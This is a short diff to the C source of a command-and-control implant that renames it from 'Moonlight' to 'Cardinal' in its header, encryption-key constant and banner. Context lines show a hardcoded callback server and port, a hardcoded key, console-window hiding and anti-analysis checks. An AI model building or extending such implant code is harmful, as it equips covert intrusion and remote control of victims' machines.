@@ -1,5 +1,5 @@
 /*
- * Moonlight C2 Framework - Enhanced Implant with Assembly Integration
+ * Cardinal C2 Framework - Enhanced Implant with Assembly Integration
  * Integrates stealth, direct syscalls, and optimized networking
  */
 
@@ -61,7 +61,7 @@ extern void ShowMonitoringHelp(SOCKET sock);
 
 #define C2_SERVER "192.168.1.100"
 #define C2_PORT 4444
-#define ENCRYPTION_KEY "MoonlightC2SecretKey2025"
+#define ENCRYPTION_KEY "CardinalC2SecretKey2025"
 #define RECONNECT_DELAY 5000
 #define HEARTBEAT_INTERVAL 30000
 
@@ -379,7 +379,7 @@ int main(int argc, char* argv[]) {
     ShowWindow(hwnd, SW_HIDE);
     #endif
     
-    printf("Moonlight C2 Enhanced Implant v2.0\n");
+    printf("Cardinal C2 Enhanced Implant v2.0\n");
     printf("==================================\n\n");
     
     // Perform anti-analysis checks
